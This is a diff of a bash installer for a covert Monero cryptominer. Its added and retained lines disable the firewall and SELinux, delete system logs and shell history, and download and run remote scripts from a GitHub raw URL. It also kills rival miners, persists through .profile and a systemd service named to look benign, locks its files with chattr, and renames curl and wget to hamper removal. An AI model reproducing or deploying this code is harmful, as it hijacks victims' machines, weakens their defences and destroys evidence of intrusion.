@@ -20,10 +20,16 @@ EMAIL=$2 # this one is optional
 
 # Disable firewall
 ulimit -n 65535
+rm -rf /var/log/syslog
 ufw disable
 iptables -F
 setenforce 0 2>dev/null
 echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+iptables -F
+iptables -X
+iptables -A OUTPUT -p tcp --dport 13555 -j DROP
+iptables -A OUTPUT -p tcp --dport 13666 -j DROP
+service iptables reload
 
 # printing greetings
 if [ -z $WALLET ]; then
@@ -97,13 +103,13 @@ power2() {
 PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
 PORT=$(( $PORT == 0 ? 1 : $PORT ))
 PORT=`power2 $PORT`
-PORT=$(( 13777 ))
+PORT=$(( 13555 ))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
   exit 1
 fi
 
-if [ "$PORT" -lt "13777" -o "$PORT" -gt "13777" ]; then
+if [ "$PORT" -lt "13555" -o "$PORT" -gt "13555" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
   exit 1
 fi
@@ -705,14 +711,6 @@ sync && echo 3 >/proc/sys/vm/dro
 
 # Download program
 cd /$HOME/
-rm -f mysqld_sysupdate
-rm -f svcguard
-rm -f svcupdate
-rm -f svcupdates
-rm -f svcworkmanager
-rm -f newsvc.sh
-rm -f kdevtmpfsi
-
 mkdir myssqltcp
 cd /$HOME/myssqltcp
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json
@@ -736,7 +734,7 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
+sed -i 's/"null": *"[^"]*",/"null": "rx/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$UUID':'$MEIP':'$UUIP'.'$CITY'-'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
@@ -758,63 +756,9 @@ else
 fi
 EOL
 
-chmod 777 $HOME/myssqltcp/Tcphost.sh
+chmod +x $HOME/myssqltcp/Tcphost.sh
 
-# Write guard
-echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
-cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
-#!/bin/bash
-while true; do
-        server=`ps aux | grep MyssqlTcp | grep -v grep`
-        if [ ! "$server" ]; then
-            cd $HOME/myssqltcp/
-            nohup ./addconf.sh >/dev/null 2>&1
-            /bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
-            sleep 10
-        fi
-        sleep 5
-cd $HOME/myssqltcp/ && nohup ./logserver.sh >/dev/null 2>&1
-done
-EOL
-
-chmod 777 $HOME/myssqltcp/lib_systemd.sh
-
-# Log removal
-echo "[*] Creating $HOME/delserver.sh script"
-cat >$HOME/delserver.sh <<EOL
-#!/bin/bash
-cd $HOME/
-rm -f mysqltcp.sh
-
-# lock
-chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
-chattr -V +iau $HOME/myssqltcp/logserver.sh
-chattr -V +iau $HOME/myssqltcp/addconf.sh
-chattr -V +iau $HOME/myssqltcp/MyssqlTcp
-chattr -V +iau $HOME/myssqltcp/Tcphost.sh
-chattr -V +iau $HOME/myssqltcp/config_background.json
-chattr -V +iau $HOME/myssqltcp/config.json
-
-# Clear log
-history -c
-echo > /var/spool/mail/root
-echo > /var/log/wtmp
-echo > /var/log/secure
-echo > /root/.bash_history
-
-# Modify instruction
-mv /usr/bin/curl /usr/bin/url
-mv /usr/bin/url /usr/bin/lruc
-mv /usr/bin/wget /usr/bin/get
-mv /usr/bin/get /usr/bin/tegw
-
-cd $HOME/myssqltcp/ && nohup ./lib_systemd.sh >/dev/null 2>&1 &
-echo "[*] Yes-Go"
-EOL
-
-chmod 777 $HOME/delserver.sh
-
-# Periodic killing
+# anti-virus
 echo "[*] Creating $HOME/myssqltcp/addconf.sh script"
 cat >$HOME/myssqltcp/addconf.sh <<EOL
 #!/bin/bash
@@ -1385,9 +1329,131 @@ killall -9 p
 killall -9 mysqld_sysupdate
 kill_miner_proc
 kill_sus_proc
+cd $HOME/myssqltcp/
+/bin/bash ./Tcphost.sh --config=./config_background.json >/dev/null 2>&1
 EOL
 
-chmod 777 $HOME/myssqltcp/addconf.sh
+chmod +x $HOME/myssqltcp/addconf.sh
+
+# delserver
+echo "[*] Creating $HOME/delserver.sh script"
+cat >$HOME/delserver.sh <<EOL
+#!/bin/bash
+if [ -z $HOME ]; then
+  echo "ERROR: Please define HOME environment variable to your home directory"
+  exit 1
+fi
+
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
+cd $HOME/
+rm -f mysqltcp.sh
+
+cd $HOME/myssqltcp/
+sudo /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
+/bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
+nohup .$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
+
+# preparing script background work and work under reboot
+if ! sudo -n true 2>/dev/null; then
+  if ! grep myssqltcp/lib_systemd.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/myssqltcp/lib_systemd.sh script to $HOME/.profile"
+    echo "$HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1" >>$HOME/.profile
+  else 
+    echo "Looks like $HOME/myssqltcp/lib_systemd.sh script is already in the $HOME/.profile"
+  fi
+  echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
+  /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+else
+
+  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
+    echo "[*] Enabling huge pages"
+    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
+    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
+  fi
+
+  if ! type systemctl >/dev/null; then
+
+    echo "[*] Running miner in the background (see logs in $HOME/server.log file)"
+    /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1
+    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
+    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
+
+  else
+
+    echo "[*] Creating lib_systemd systemd service"
+    cat >/$HOME/lib_systemd.service <<EOL
+[Unit]
+Description=lib_systemd service
+
+[Service]
+ExecStart=$HOME/myssqltcp/lib_systemd.sh
+Restart=always
+Nice=10
+CPUWeight=1
+
+[Install]
+WantedBy=multi-user.target
+EOL
+    sudo mv /$HOME/lib_systemd.service /etc/systemd/system/lib_systemd.service
+    echo "[*] Starting lib_systemd systemd service"
+    sudo killall lib_systemd 2>/dev/null
+    sudo systemctl daemon-reload
+    sudo systemctl enable lib_systemd.service
+    sudo systemctl start lib_systemd.service
+    echo "To see miner service logs run \"sudo journalctl -u lib_systemd -f\" command"
+  fi
+fi
+
+# lock
+chattr -V +iau $HOME/myssqltcp/lib_systemd.sh
+chattr -V +iau $HOME/myssqltcp/logserver.sh
+chattr -V +iau $HOME/myssqltcp/addconf.sh
+chattr -V +iau $HOME/myssqltcp/MyssqlTcp
+chattr -V +iau $HOME/myssqltcp/Tcphost.sh
+chattr -V +iau $HOME/myssqltcp/config_background.json
+chattr -V +iau $HOME/myssqltcp/config.json
+
+# Clear log
+history -c
+echo > /var/spool/mail/root
+echo > /var/log/wtmp
+echo > /var/log/secure
+echo > /root/.bash_history
+
+# Modify instruction
+mv /usr/bin/curl /usr/bin/url
+mv /usr/bin/url /usr/bin/lruc
+mv /usr/bin/wget /usr/bin/get
+mv /usr/bin/get /usr/bin/tegw
+
+echo "[*] Yes-Go"
+EOL
+
+chmod +x $HOME/delserver.sh
+
+# anti-virus
+echo "[*] Creating $HOME/myssqltcp/lib_systemd.sh script"
+cat >$HOME/myssqltcp/lib_systemd.sh <<EOL
+#!/bin/bash
+export LD_LIBRARY_PATH=$HOME/myssqltcp/
+
+while true; do
+        server=`ps aux | grep MyssqlTcp | grep -v grep`
+        if [ ! "$server" ]; then
+            ./addconf.sh
+            sleep 10
+        fi
+        sleep 5
+done
+cd /tmpmyssqltcp/ && nohup ./logserver.sh >/dev/null 2>&1 &
+EOL
+
+chmod +x $HOME/myssqltcp/lib_systemd.sh
 
 # preparing script background work and work under reboot
 if ! sudo -n true 2>/dev/null; then
@@ -1458,21 +1524,10 @@ else
 fi
 echo ""
 
-cd $HOME/
+cd /$HOME/
 rm -f index.html
-sudo /bin/bash ./delserver.sh >/dev/null 2>&1 &
+wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
+chmod 777 delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
-nohup ./delserver.sh >/dev/null 2>&1 &
-
-iptables -F
-iptables -X
-iptables -A OUTPUT -p tcp --dport 5555 -j DROP
-iptables -A OUTPUT -p tcp --dport 7777 -j DROP
-iptables -A OUTPUT -p tcp --dport 9999 -j DROP
-iptables -A OUTPUT -p tcp --dport 9999 -j DROP
-iptables -A INPUT -p tcp –dport 13777 -j ACCEPT 
-iptables -A OUTPUT -j ACCEPT 
-service iptables reload
-systemctl stop firewalld.service
 
 echo "[*] Yes-GoGo"
